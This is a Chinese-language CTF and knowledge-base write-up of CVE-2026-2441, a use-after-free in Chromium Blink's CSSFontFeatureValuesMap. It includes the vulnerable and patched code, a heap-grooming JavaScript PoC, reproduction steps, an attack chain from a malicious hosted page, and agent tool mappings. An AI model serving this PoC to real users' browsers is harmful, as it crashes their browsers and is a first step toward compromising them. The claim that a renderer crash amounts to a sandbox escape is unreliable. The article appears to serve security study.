---
id: "ctf-website/09-cve/01-browser-sandbox-escape"
title: "Blink UAF：CSSFontFeatureValuesMap 迭代器悬空指针（CVE-2026-2441）"
title_en: "Blink UAF: CSSFontFeatureValuesMap Iterator Dangling Pointer (CVE-2026-2441)"
summary: >
  Chromium Blink渲染引擎UAF漏洞分析，CSSFontFeatureValuesMap迭代器持有HashMap原始指针，迭代过程中delete()+set()触发rehash导致悬空指针。涵盖受影响版本范围、根因分析（迭代器持有原始指针vs修复后的值拷贝）、PoC触发流程与堆布局整理，以及UAF到完整RCE所需的条件链。
summary_en: >
  Analysis of a Chromium Blink UAF vulnerability where CSSFontFeatureValuesMap iterator holds a raw HashMap pointer, and delete()+set() during iteration triggers rehash causing a dangling pointer. Covers affected version ranges, root cause analysis (raw pointer in iterator vs value copy fix), PoC trigger flow with heap grooming, and the condition chain from UAF to full RCE.
board: "ctf-website"
category: "09-cve"
signals: ["Blink UAF", "Chrome sandbox escape", "CSSFontFeatureValuesMap", "HashMap rehash", "浏览器沙箱逃逸", "CVE-2026-2441", "Chromium"]
mcp_tools: ["kb_router", "http_probe", "workspace_write_text"]
keywords: ["CVE-2026-2441", "Chrome UAF", "Blink渲染引擎", "HashMap悬空指针", "浏览器漏洞利用", "Chromium沙箱", "heap grooming", "V8对象混淆"]
difficulty: "advanced"
tags: ["cve", "browser-exploitation", "uaf", "sandbox-escape", "ctf"]
language: "zh-CN"
last_updated: "2026-06-25"
related_articles: []
---
# Blink UAF：CSSFontFeatureValuesMap 迭代器悬空指针（CVE-2026-2441）

## 1. 受影响版本

| 浏览器 | 受影响版本 | 修复版本 |
|--------|-----------|---------|
| Chrome Stable | < 145.0.7632.75 | >= 145.0.7632.75 |
| Chrome Linux | < 144.0.7559.75 | >= 144.0.7559.75 |
| Edge | < 145.0.7632.75 | >= 145.0.7632.75 |
| Brave | < 145.0.7632.75 | >= 145.0.7632.75 |

所有基于 Chromium 的浏览器均受影响。补丁提交：`63f3cb4864c64c677cd60c76c8cb49d37d08319c`。

## 2. 根因：迭代器持有 HashMap 原始指针

`CSSFontFeatureValuesMap` 底层为 `FontFeatureAliases`（WTF::HashMap）。`FontFeatureValuesMapIterationSource` 在构造时持有该 HashMap 的**原始指针**：

```cpp
// 有漏洞的代码
class FontFeatureValuesMapIterationSource {
 public:
  FontFeatureValuesMapIterationSource(const CSSFontFeatureValuesMap& map,
                                      const FontFeatureAliases* aliases)
      : map_(map), aliases_(aliases), iterator_(aliases_->begin()) {}
 private:
  const FontFeatureAliases* aliases_;  // rehash 后悬空
};
```

迭代过程中调用 `map.delete()` + `map.set()` 触发 HashMap rehash → 旧存储区释放 → `aliases_` 悬空 → `FetchNextItem()` 访问已释放内存 → **UAF**。

### Patch 方案

```cpp
// 修复后：值拷贝，rehash 不影响副本
class FontFeatureValuesMapIterationSource {
 public:
  FontFeatureValuesMapIterationSource(const CSSFontFeatureValuesMap& map,
                                      const FontFeatureAliases aliases)
      : map_(map), aliases_(std::move(aliases)), iterator_(aliases_.begin()) {}
 private:
  const FontFeatureAliases aliases_;  // 独立副本
};
```

## 3. PoC 触发流程（exp.html）

```javascript
// 1. 获取 CSSFontFeatureValuesMap
const sheet = document.getElementById("target-style").sheet;
const rule = sheet.cssRules[0];            // CSSFontFeatureValuesRule
const map = rule.styleset;                 // CSSFontFeatureValuesMap

// 2. 堆布局整理：创建 50 个相同尺寸对象
for (let i = 0; i < 50; i++) {
  groomStyle.sheet.insertRule(
    `@font-feature-values GroomFont${i} { @styleset { g${i}: ${i}; } }`,
    groomStyle.sheet.cssRules.length
  );
}

// 3. UAF 触发：迭代 + 突变交替
const iterator = map.entries();
let step = 0;
while (step < 20) {
  const result = iterator.next();          // FetchNextItem() → 读 aliases_
  const [key, value] = result.value;
  map.delete(key);                         // 触发 HashMap 修改
  for (let i = 0; i < 512; i++) {
    map.set("spray_" + step + "_" + i, [i, i + 1, i + 2]);  // 强制 rehash
  }
  step++;
}
```

每轮 `delete()` + 512 次 `set()` 必然触发 rehash（8 条 entry 的 map 插入 512 条必然扩容），`aliases_` 指针指向已释放存储区。

## 4. 版本检测

```javascript
function isVulnerable(vStr) {
  const v = parseVersion(vStr);
  if (v.major < 145) return true;
  if (v.major > 145) return false;
  if (v.build < 7632) return true;
  if (v.build > 7632) return false;
  return v.patch < 75;
}
```

## 5. 攻击链

```
攻击者托管恶意 HTML（含 PoC JS）
    ↓
目标使用受影响 Chrome 访问页面
    ↓
JS 创建 @font-feature-values CSS 规则
    ↓
获取 CSSFontFeatureValuesMap → 调用 entries() 获得迭代器
    ↓
迭代循环中 delete() + set() → HashMap rehash → aliases_ 悬空
    ↓
iterator.next() → FetchNextItem() → UAF → 渲染进程崩溃或代码执行
    ↓
完整 RCE 需 V8 对象混淆 / 类型混淆实现代码执行
    ↓
渲染进程被攻陷 → 进一步利用浏览器漏洞链 → 沙箱逃逸
```

## 6. 利用难度

| 特性 | 说明 |
|------|------|
| 利用门槛 | 中等 — 需理解 HashMap rehash 和 Blink 迭代器实现 |
| 稳定性 | 中等 — 通过 heap grooming 提高可靠性 |
| 触发确定性 | 高 — 20 轮迭代 + 512 次写入，rehash 必然发生 |
| 沙箱穿透 | 渲染进程崩溃即沙箱逃逸；完整 RCE 需 V8 利用链 |

## 7. 复现

```bash
# 直接打开 PoC
open exploit/exp.html

# 或启动本地 HTTP 服务器
python3 -m http.server 8080
# 浏览器访问 http://localhost:8080/exp.html
```

### 预期输出

**受影响版本：**
```
[+] CSSFontFeatureValuesMap obtained. Size: 8
[+] 50 groom objects created.
[!] EXCEPTION caught: ... (或渲染进程直接崩溃)
[!] THIS VERSION IS VULNERABLE!
```

**已修复版本：**
```
[+] Iteration completed (8 entries processed).
[+] This version is patched.
```

## 8. 完整 RCE 需额外条件

UAF 本身导致渲染进程崩溃（DoS）。要实现完整 RCE，需要：
1. **V8 对象混淆** — 利用 UAF 将被释放内存重新分配给可控 JS 对象
2. **类型混淆** — 伪造 v8::Object 头部，获得任意读写
3. **ROP/JOP chain** — 绕过 CFI/CET，执行 shellcode
4. **沙箱逃逸** — 利用 renderer 进程中的额外漏洞

## Evidence

记录: 浏览器版本、渲染进程崩溃日志、`exp.html` 触发轮次、heap grooming 对象数量

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 知识检索 | `kb_router` | 按 Blink UAF / HashMap rehash 信号搜索 |
| HTTP 服务 | `http_probe` | 本地 HTTP 服务托管 PoC |
| 浏览器自动化 | `playwright` | 启动目标版本浏览器，加载 exp.html |
| 写分析笔记 | `workspace_write_text` | 记录复现结果 |

## 参考资料

| 来源 | 链接 |
|------|------|
| 原始 PoC | https://github.com/huseyinstif/CVE-2026-2441-PoC |
| Chromium 补丁 | `63f3cb4864c64c677cd60c76c8cb49d37d08319c` |
| Chrome 公告 | https://chromereleases.googleblog.com/2026/02/stable-channel-update-for-desktop_13.html |
| NVD | https://nvd.nist.gov/vuln/detail/CVE-2026-2441 |
| CISA KEV | https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-2441 |
| poc-lab 源 | https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-2441%20Chrome%20CSSFontFeatureValuesMap%20UAF |
